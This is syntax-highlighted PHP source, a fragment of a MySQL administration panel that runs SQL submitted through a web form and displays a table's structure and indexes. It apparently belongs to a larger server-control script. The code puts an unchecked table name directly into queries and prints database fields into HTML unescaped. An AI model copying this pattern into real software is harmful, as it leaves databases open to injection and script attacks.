<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">runquery</span> = <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">sql_query</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">runquery</span> = <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">allowedit</span> = <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">tablename</span> &amp;&amp; !$<span style="color: #ffeead;">sql_query</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">sql_query</span> = <span style="color: #99ffff;">"SELECT * FROM $tablename"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">getnumsql</span> = $<span style="color: #ffeead;">sql_query</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">sql_query</span> = $<span style="color: #ffeead;">sql_query</span>.<span style="color: #99ffff;">" LIMIT $start_limit, $pagenum"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">allowedit</span> = <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;form action="'</span>.$<span style="color: #ffeead;">self</span>.<span style="color: #99ffff;">'" method="POST"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;</span><span style="color: #99ffff; text-decoration: underline;">&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">sql_query</span><span style="text-decoration: underline;">,</span><span style="color: #bbdaff; text-decoration: underline;">ENT_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'tablename'</span>, $<span style="color: #ffeead;">tablename</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'mysqladmin'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">dbform</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/form&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">tablename</span> || ($<span style="color: #ffeead;">runquery</span> &amp;&amp; $<span style="color: #ffeead;">sql_query</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'structure'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">result</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SHOW FULL COLUMNS FROM $tablename"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rowdb</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span>($<span style="color: #ffeead;">row</span> = <span style="color: #ffffff; background-color: #002451;">mysql_fetch_array(</span>$<span style="color: #ffeead;">result</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rowdb</span>[] = $<span style="color: #ffeead;">row</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h3&gt;Structure&lt;/h3&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Key&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Default&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Extra&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Privileges&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">rowdb</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">row</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">thisbg</span> = <span style="color: #ffffff; background-color: #002451;">bg(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.$<span style="color: #ffeead;">thisbg</span>.<span style="color: #99ffff;">'" onmouseover="this.className=\</span><span style="color: #99ffff; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Field'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Type'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Collation'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Null'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Key'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Default'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Extra'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Privileges'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Comment'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">tbfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">result</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SHOW INDEX FROM $tablename"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rowdb</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span>($<span style="color: #ffeead;">row</span> = <span style="color: #ffffff; background-color: #002451;">mysql_fetch_array(</span>$<span style="color: #ffeead;">result</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rowdb</span>[] = $<span style="color: #ffeead;">row</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h3&gt;Indexes&lt;/h3&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Keyname&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Unique&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Packed&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Seq_in_index&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Cardinality&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">rowdb</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">row</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">thisbg</span> = <span style="color: #ffffff; background-color: #002451;">bg(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.$<span style="color: #ffeead;">thisbg</span>.<span style="color: #99ffff;">'" onmouseover="this.className=\</span><span style="color: #99ffff; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Key_name'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Index_type'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.($<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Non_unique'</span>] ? <span style="color: #99ffff;">'No'</span> : <span style="color: #99ffff;">'Yes'</span>).<span style="color: #99ffff;">'&amp;nbsp;&lt;/td</span><span style="color: #99ffff; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.($<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Packed'</span>] === <span style="color: #bbdaff;">null</span> ? <span style="color: #99ffff;">'No'</span> : $<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Packed'</span><span style="text-decoration: underline;">]).</span><span style="color: #99ffff; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Seq_in_index'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
